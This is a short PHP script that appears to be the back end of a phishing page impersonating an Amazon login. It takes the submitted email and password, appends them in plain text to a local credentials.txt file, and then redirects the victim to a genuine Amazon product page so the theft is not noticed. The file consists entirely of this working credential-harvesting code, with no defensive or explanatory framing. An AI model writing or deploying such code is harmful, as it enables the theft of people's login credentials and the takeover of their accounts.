<?php
 //Extract the credentials received
 $username = $_POST["email"];
 $password = $_POST["password"];



 $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");

 $txt = "USERNAME = $username , PASSWORD = $password\n";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 //Redirect the browser to original login page
 header("Location: https://www.amazon.com/dp/B01E6AO69U/ref=ods_gw_ha_d_white?pf_rd_p=4a14e6ce-9ad7-4d30-8874-2e112490a43e&pf_rd_r=E58SKPFF5RA13KW7JQ3M");
 exit();


 ?>